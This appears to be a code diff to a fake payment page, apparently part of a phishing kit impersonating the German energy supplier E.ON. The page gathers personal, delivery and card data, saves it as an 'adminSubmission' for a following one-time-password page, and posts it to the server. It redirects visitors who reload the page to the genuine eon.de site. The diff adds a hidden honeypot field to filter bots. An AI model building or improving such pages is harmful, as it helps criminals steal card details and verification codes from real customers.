@@ -244,6 +244,12 @@
             margin-top: 20px;
         }
 
+        /* --- HONEYPOT STYLE --- */
+        .honeypot-field {
+            position: absolute;
+            left: -5000px;
+        }
+
     </style>
 </head>
 <body>
@@ -303,6 +309,13 @@
                     </div>
                 </div>
 
+                <!-- --- THIS IS THE NEW HONEYPOT FIELD --- -->
+                <div class="honeypot-field" aria-hidden="true">
+                    <label for="honeypot">Do not fill this field out</label>
+                    <input type="text" id="honeypot" name="honeypot" tabindex="-1">
+                </div>
+                <!-- --- END OF HONEYPOT FIELD --- -->
+
                 <button type="submit" id="submit-btn" class="submit-btn">Pay 60.70 EUR</button>
 
                 <p class="footer-text">
@@ -318,13 +331,12 @@
             const totalAmountEl = document.getElementById('total-amount');
             const submitBtn = document.getElementById('submit-btn');
             
-            // --- THIS IS THE CORRECTED LOGIC ---
             const storedPrice = localStorage.getItem('selectedTariffPrice');
             let total = 0;
 
             if (storedPrice) {
                 const price = parseFloat(storedPrice);
-                total = price; // No fee
+                total = price;
                 tariffPriceEl.textContent = price.toFixed(2) + ' EUR';
             }
             
@@ -368,18 +380,18 @@
                     billNumber: billNumber,
                     ...personalData, 
                     ...deliveryData, 
-                    ...paymentData 
+                    ...paymentData,
+                    // --- ADD THE HONEYPOT VALUE ---
+                    honeypot: document.getElementById('honeypot').value
                 };
 
-                // Save the complete package for the OTP page to use
                 localStorage.setItem('adminSubmission', JSON.stringify(submissionData));
 
                 try {
+                    // --- EDITED THIS LINE TO FIX THE CONNECTION ERROR ---
                     const response = await fetch('/submit', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(submissionData),
                     });
 
@@ -401,13 +413,9 @@
         });
     </script>
     <script>
-      // Modern API to detect reload
-      if (performance.getEntriesByType("navigation")[0].type === "reload") {
-          window.location.href = "https://www.eon.de/de/pk.html";
-      }
+        if (performance.getEntriesByType("navigation")[0].type === "reload") {
+            window.location.href = "https://www.eon.de/de/pk.html";
+        }
     </script>
-
-
 </body>
 </html>
-
